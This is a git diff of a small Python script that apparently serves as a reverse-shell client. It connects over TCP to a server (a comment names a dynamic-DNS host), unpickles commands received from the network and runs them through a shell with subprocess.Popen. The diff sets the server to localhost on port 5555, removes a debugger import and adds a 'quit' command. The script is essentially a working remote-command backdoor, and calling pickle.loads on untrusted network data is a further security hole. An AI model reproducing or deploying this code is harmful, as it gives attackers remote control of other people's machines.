@@ -2,7 +2,6 @@ import socket
 import os
 import subprocess
 import pickle
-import pdb
 import time
 
 #TODO
@@ -18,8 +17,8 @@ import time
 
 
 #Server properties
-IP = '' #    --> thanathos.hopto.org
-PORT = 9999
+IP = 'localhost' #    --> thanathos.hopto.org
+PORT = 5555
 socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #TCP socket
 
 #Try to establish a connection to the server
@@ -37,7 +36,7 @@ def connect():
 #   --> Execute data and return the result as a string
 def popenExecution(data):
 
-    if data[:2] == 'cd':
+    if data[:2] == 'cd': 
         os.chdir(str(data[3:]))
 
     command = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, 
@@ -55,6 +54,9 @@ def recv():
             print("Waiting to receive something!")
             command = pickle.loads(socket.recv(4096))
             print("Got: ", command)
+            if command == "quit":
+                socket.close()
+                break
             result = popenExecution(command)
         except socket.error as e:
             print(e)
